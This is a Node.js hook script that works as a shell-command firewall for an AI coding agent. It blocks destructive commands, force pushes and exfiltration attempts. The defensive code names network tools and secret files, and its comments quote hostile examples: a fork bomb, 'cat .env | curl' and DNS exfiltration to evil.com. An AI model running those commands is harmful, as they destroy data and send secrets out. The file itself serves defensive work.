#!/usr/bin/env node
// Bash Firewall — PreToolUse hook (matcher: Bash)
// Blocks destructive commands, force pushes, exfiltration attempts.
// Output: {"decision":"block","reason":"..."} to block, or exit silently to allow.
//
// Install: copy to ~/.claude/hooks/ and add to settings.json
// Zero dependencies — Node.js built-ins only.

'use strict';

const PROTECTED_BRANCHES = (process.env.PROTECTED_BRANCHES || 'main,master').split(',').map(b => b.trim());

const SENSITIVE_FILE_PATTERNS = [
  /\.env\b/,
  /\bid_rsa\b/,
  /\bid_ed25519\b/,
  /\.pem$/,
  /\.key$/,
  /credentials\.json/,
  /\.secret[s]?\b/,
  /secret_key\.[\w]+/,
];

// G-1799: commands longer than this are blocked before any other work. Claude
// Code kills a hook at its per-hook timeout (the installer sets 5 s) and a
// killed hook renders no decision — the tool call proceeds. A size cap plus
// linear-time checks keeps the firewall's worst case far below that timeout.
const MAX_COMMAND_CHARS = 100000;

// ---------------------------------------------------------------------------
// Linear-time helpers (G-1799)
//
// Rule for every pattern in this file: a quantified character class may only
// start where the previous char is outside that class (lookbehind or index
// anchoring), and there is no `.*` / unbounded class between an unanchored
// start and a literal that can fail. Prefer "find the first index, then test
// the remainder".
// ---------------------------------------------------------------------------

// A short-flag cluster: `-` preceded by whitespace, then a maximal run of
// letters that is followed by a non-word char or the end. Equivalent to the
// old /\s-[a-zA-Z]*X[a-zA-Z]*\b/ family but linear (one start per cluster).
const FLAG_CLUSTER_RE = /(?<=\s)-([a-zA-Z]+)(?!\w)/g;

/** True when some short-flag cluster in `cmd` contains `letter`. */
function hasFlagLetter(cmd, letter) {
  FLAG_CLUSTER_RE.lastIndex = 0;
  let m;
  while ((m = FLAG_CLUSTER_RE.exec(cmd)) !== null) {
    if (m[1].includes(letter)) return true;
  }
  return false;
}

// ---------------------------------------------------------------------------
// Command normalization
// ---------------------------------------------------------------------------

/**
 * Strips line continuations (\\\n) and collapses runs of whitespace.
 */
function normalizeCommand(cmd) {
  return cmd
    .replace(/\\\n/g, ' ')     // line continuations
    .replace(/\s+/g, ' ')      // collapse whitespace
    .trim();
}

/**
 * Splits a command string on ;, &&, ||, | while respecting single/double quotes.
 * Returns an array of individual command strings.
 */
function splitCommands(cmd) {
  const parts = [];
  let current = '';
  let inSingle = false;
  let inDouble = false;
  let i = 0;

  while (i < cmd.length) {
    const ch = cmd[i];

    // Handle escape sequences
    if (ch === '\\' && i + 1 < cmd.length) {
      current += ch + cmd[i + 1];
      i += 2;
      continue;
    }

    // Track quote state
    if (ch === "'" && !inDouble) {
      inSingle = !inSingle;
      current += ch;
      i++;
      continue;
    }
    if (ch === '"' && !inSingle) {
      inDouble = !inDouble;
      current += ch;
      i++;
      continue;
    }

    // Only split when outside quotes
    if (!inSingle && !inDouble) {
      // Check for &&, ||
      if ((cmd[i] === '&' && cmd[i + 1] === '&') || (cmd[i] === '|' && cmd[i + 1] === '|')) {
        parts.push(current.trim());
        current = '';
        i += 2;
        continue;
      }
      // Check for ; or single |
      if (ch === ';' || ch === '|') {
        parts.push(current.trim());
        current = '';
        i++;
        continue;
      }
    }

    current += ch;
    i++;
  }

  if (current.trim()) {
    parts.push(current.trim());
  }

  return parts.filter(Boolean);
}

// ---------------------------------------------------------------------------
// Individual checks — each returns a reason string or null
// ---------------------------------------------------------------------------

/**
 * Blocks rm with both -r and -f flags targeting / or /*
 */
function checkDestructiveRm(cmd) {
  // Match rm commands with -rf or -r -f (in any order) targeting root
  if (!/\brm\b/.test(cmd)) return null;

  const hasRecursive = hasFlagLetter(cmd, 'r') || /\s--recursive\b/.test(cmd);
  const hasForce = hasFlagLetter(cmd, 'f') || /\s--force\b/.test(cmd);

  if (hasRecursive && hasForce) {
    // Check for root path targets
    if (/\s\/(\s|$|\*)/.test(cmd) || /\s\/\*/.test(cmd)) {
      return 'Blocked: rm -rf targeting root filesystem';
    }
    // H-5: Block rm -rf targeting home directory
    if (/\s~(\/|\s|$)/.test(cmd) || /\s\$HOME\b/.test(cmd)) {
      return 'Blocked: rm -rf targeting home directory';
    }
    // H-5: Block rm -rf targeting /home/ or /Users/ (all user directories)
    if (/\s\/home(\/|\s|$)/.test(cmd) || /\s\/Users(\/|\s|$)/.test(cmd)) {
      return 'Blocked: rm -rf targeting user directories';
    }
  }
  return null;
}

/**
 * Blocks force push to protected branches (main/master by default).
 */
function checkForceGitPush(cmd) {
  if (!/\bgit\s+push\b/.test(cmd)) return null;
  const hasForce = /\s--force\b/.test(cmd) || /\s-f\b/.test(cmd) || /\s--force-with-lease\b/.test(cmd);
  if (!hasForce) return null;

  for (const branch of PROTECTED_BRANCHES) {
    // H-4: Escape regex metacharacters in branch names to prevent ReDoS / bypass
    const escaped = branch.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    // "git push -f origin main" or "git push --force origin master"
    if (new RegExp(`\\b${escaped}\\b`).test(cmd)) {
      return `Blocked: force push to protected branch "${branch}"`;
    }
  }
  return null;
}

/**
 * Blocks git reset --hard.
 */
function checkHardReset(cmd) {
  if (/\bgit\s+reset\s+--hard\b/.test(cmd)) {
    return 'Blocked: git reset --hard can destroy uncommitted work';
  }
  return null;
}

/**
 * Blocks git clean -f (removes untracked files permanently).
 */
function checkGitClean(cmd) {
  if (/\bgit\s+clean\b/.test(cmd) && /\s-[a-zA-Z]*f/.test(cmd)) {
    return 'Blocked: git clean -f permanently removes untracked files';
  }
  return null;
}

/**
 * Blocks writes (redirects >, >>) to system directories.
 */
// A single `>` immediately followed by optional whitespace and the path. An
// append redirect (`>>`) is still caught, because its last `>` precedes the
// path. (The old `>+\s*` form was quadratic on a run of `>` chars — G-1799.)
const SYSTEM_WRITE_PATTERNS = ['/etc/', '/usr/', '/System/', '/Library/']
  .map(sysPath => [sysPath, new RegExp(`>\\s*${sysPath.replace(/\//g, '\\/')}`)]);

function checkSystemFileWrite(cmd) {
  for (const [sysPath, pattern] of SYSTEM_WRITE_PATTERNS) {
    if (pattern.test(cmd)) {
      return `Blocked: redirect to system path ${sysPath}`;
    }
  }
  return null;
}

/**
 * Blocks chmod 777 recursive or on root paths.
 */
function checkDangerousChmod(cmd) {
  if (!/\bchmod\b/.test(cmd)) return null;

  const has777 = /\b777\b/.test(cmd);
  const hasRecursive = hasFlagLetter(cmd, 'R') || /\s--recursive\b/.test(cmd);
  const targetsRoot = /\s\/(\s|$)/.test(cmd);

  if (has777 && (hasRecursive || targetsRoot)) {
    return 'Blocked: dangerous chmod 777 (recursive or on root)';
  }
  return null;
}

/**
 * Blocks fork bombs: :(){ :|:& };: and common variants.
 */
function checkForkBomb(cmd) {
  // Classic bash fork bomb: a colon-name definition, then `:|:`, then `}`.
  // Linear form of /:\(\)\s*\{.*:\|:.*\}/ — the first definition leaves the
  // most room for what follows, so testing from its end is equivalent.
  const colonDef = /:\(\)\s*\{/.exec(cmd);
  if (colonDef) {
    const afterDef = colonDef.index + colonDef[0].length;
    const pipeAt = cmd.indexOf(':|:', afterDef);
    if (pipeAt !== -1 && cmd.indexOf('}', pipeAt + 3) !== -1) {
      return 'Blocked: fork bomb detected';
    }
  }
  // Function-based variants: a word-name definition followed by `| word &`,
  // and elsewhere `}`, optional `;`, and a word. Linear form of
  // /\w+\(\)\s*\{.*\|\s*\w+\s*&/ && /\}\s*;?\s*\w+/ — the lookbehind gives one
  // start per word instead of one per char.
  const wordDef = /(?<!\w)\w+\(\)\s*\{/.exec(cmd);
  if (wordDef) {
    const rest = cmd.slice(wordDef.index + wordDef[0].length);
    if (/\|\s*\w+\s*&/.test(rest) && /\}\s*(?:;\s*)?\w/.test(cmd)) {
      return 'Blocked: possible fork bomb detected';
    }
  }
  return null;
}

/**
 * Blocks dd writing to block devices and mkfs commands.
 */
function checkDiskWiper(cmd) {
  // dd writing to /dev/*
  if (/\bdd\b/.test(cmd) && /if=\/dev\/(zero|random|urandom)/.test(cmd) && /of=\/dev\//.test(cmd)) {
    return 'Blocked: dd targeting block device (disk wipe)';
  }
  // mkfs on any device
  if (/\bmkfs\b/.test(cmd)) {
    return 'Blocked: mkfs can destroy filesystem data';
  }
  return null;
}

/**
 * Blocks curl/wget/nc posting sensitive files and common exfiltration bypass patterns.
 *
 * Known limitations:
 * - Cannot detect exfiltration via DNS tunneling (e.g., dig $(cat .env).evil.com)
 * - Cannot detect exfiltration via encoded variable expansion (e.g., eval "$encoded")
 * - Cannot detect exfiltration split across multiple separate commands
 * - Inline script detection (python3 -c, node -e) only checks for sensitive file refs,
 *   not arbitrary network calls within the script string
 */
function checkExfiltration(cmd) {
  const hasUploadTool = /\b(curl|wget|nc|ncat|netcat)\b/.test(cmd);

  // H-3: Detect piped exfiltration — cat <sensitive> | curl/wget/nc (across full command)
  if (hasUploadTool) {
    for (const pattern of SENSITIVE_FILE_PATTERNS) {
      if (pattern.test(cmd)) {
        const match = cmd.match(pattern);
        return `Blocked: potential exfiltration of sensitive file (matched: ${match[0]})`;
      }
    }
  }

  // H-3: Detect cat <sensitive> piped to network tool (checks across pipe boundaries)
  const fullNormalized = cmd;
  if (/\bcat\b/.test(fullNormalized) && /\|/.test(fullNormalized) && hasUploadTool) {
    for (const pattern of SENSITIVE_FILE_PATTERNS) {
      if (pattern.test(fullNormalized)) {
        const match = fullNormalized.match(pattern);
        return `Blocked: piped exfiltration of sensitive file (matched: ${match[0]})`;
      }
    }
  }

  // H-3: Detect encoded command execution — base64 decode piped to shell
  // Linear form of /\bbase64\b.*-d\b/: find the first base64 word, then test
  // the decode flag on the remainder. The pipe-to-shell test is anchored at |.
  const b64 = /\bbase64\b/.exec(cmd);
  if (b64 && /-d\b/.test(cmd.slice(b64.index + b64[0].length)) &&
      /\|\s*(sh|bash|zsh)\b/.test(cmd)) {
    return 'Blocked: base64-decoded command execution (base64 -d | sh)';
  }

  // H-3: Detect inline script execution referencing sensitive files
  if (/\b(python3?|node)\s+(-c|-e)\b/.test(cmd)) {
    for (const pattern of SENSITIVE_FILE_PATTERNS) {
      if (pattern.test(cmd)) {
        const match = cmd.match(pattern);
        return `Blocked: inline script referencing sensitive file (matched: ${match[0]})`;
      }
    }
  }

  return null;
}

/**
 * Blocks the May 22, 2026 postinstall-worm signature:
 * a TLS-verify-disabled download writing a binary into /tmp/ for later execution.
 *
 * Reference: Socket — Malicious Postinstall Hook Found Across 700+ GitHub Repositories
 * (parikhpreyash4/systemd-network-helper-aa5c751f → /tmp/.sshd).
 *
 * The combination of (1) disabled TLS verification and (2) writing to /tmp/
 * is the worm fingerprint. Either signal alone is plausible; together they are
 * effectively never legitimate in agent-driven bash.
 */
function hasInsecureFetch(cmd) {
  // Linear form of /\bcurl\b[^|;&]*\s(-[a-zA-Z]*k[a-zA-Z]*|--insecure)\b/ and
  // the wget twin: split into |;& segments in one pass; within each segment
  // find the FIRST curl/wget, then test the insecure flag on the remainder.
  for (const seg of cmd.split(/[|;&]/)) {
    const curl = /\bcurl\b/.exec(seg);
    if (curl) {
      const rest = seg.slice(curl.index + curl[0].length);
      if (hasFlagLetter(rest, 'k') || /\s--insecure\b/.test(rest)) return true;
    }
    const wget = /\bwget\b/.exec(seg);
    if (wget) {
      const rest = seg.slice(wget.index + wget[0].length);
      if (/\s(--no-check-certificate|--no-check-cert)\b/.test(rest)) return true;
    }
  }
  return false;
}

function checkInsecureBinaryDrop(cmd) {
  if (!hasInsecureFetch(cmd)) return null;

  // -o /tmp/..., > /tmp/..., or curl's default-redirect form curl ... /tmp/...
  const writesToTmp =
    /\s-o\s+\/tmp\//.test(cmd) ||
    /\s-O\s+\/tmp\//.test(cmd) ||
    />\s*\/tmp\//.test(cmd) ||
    /\s\/tmp\/\S+/.test(cmd);
  if (!writesToTmp) return null;

  return 'Blocked: TLS-verify-disabled download writing to /tmp/ — matches the May 2026 postinstall-worm signature (700+ repos campaign)';
}

// ---------------------------------------------------------------------------
// Main
// ---------------------------------------------------------------------------

const ALL_CHECKS = [
  checkDestructiveRm,
  checkForceGitPush,
  checkHardReset,
  checkGitClean,
  checkSystemFileWrite,
  checkDangerousChmod,
  checkForkBomb,
  checkDiskWiper,
  checkExfiltration,
  checkInsecureBinaryDrop,
];

function runChecks(command) {
  // G-1799: fail closed on oversized input before any regex runs.
  if (command.length > MAX_COMMAND_CHARS) {
    return `Blocked: command is ${command.length} chars, which exceeds the bash firewall's ` +
      `${MAX_COMMAND_CHARS}-char limit — the firewall fails closed on input too large to ` +
      'analyse in time. Split the command, or use the Write tool for large content.';
  }

  const normalized = normalizeCommand(command);
  const subcommands = splitCommands(normalized);

  for (const sub of subcommands) {
    for (const check of ALL_CHECKS) {
      const reason = check(sub);
      if (reason) return reason;
    }
  }

  // H-3: Run exfiltration check against the full normalized command
  // so piped patterns (cat .env | curl ...) are detected across pipe boundaries
  const fullReason = checkExfiltration(normalized);
  if (fullReason) return fullReason;

  return null;
}

// Hook stdin handler
function main() {
  let input = '';

  // 3-second timeout — fail closed (block) for security (C-4 fix)
  const timeout = setTimeout(() => {
    process.stdout.write(JSON.stringify({
      decision: 'block',
      reason: 'Bash firewall timed out waiting for input — blocking as precaution',
    }));
    process.exit(1);
  }, 3000);

  process.stdin.setEncoding('utf8');
  process.stdin.on('data', (chunk) => { input += chunk; });
  process.stdin.on('end', () => {
    clearTimeout(timeout);

    try {
      const event = JSON.parse(input);
      const command = event?.tool_input?.command;

      if (!command) {
        process.exit(0); // No command to check — allow
      }

      const reason = runChecks(command);
      if (reason) {
        process.stdout.write(JSON.stringify({ decision: 'block', reason }));
      }
    } catch (err) {
      // Parse error — fail closed for security (C-3 fix)
      process.stdout.write(JSON.stringify({
        decision: 'block',
        reason: `Bash firewall failed to parse input: ${err.message}. Blocking as precaution.`,
      }));
    }

    process.exit(0);
  });
}

// Run as hook or export for testing
if (require.main === module) {
  main();
}

module.exports = {
  normalizeCommand,
  splitCommands,
  checkDestructiveRm,
  checkForceGitPush,
  checkHardReset,
  checkGitClean,
  checkSystemFileWrite,
  checkDangerousChmod,
  checkForkBomb,
  checkDiskWiper,
  checkExfiltration,
  checkInsecureBinaryDrop,
  runChecks,
  hasFlagLetter,
  MAX_COMMAND_CHARS,
  PROTECTED_BRANCHES,
  SENSITIVE_FILE_PATTERNS,
};
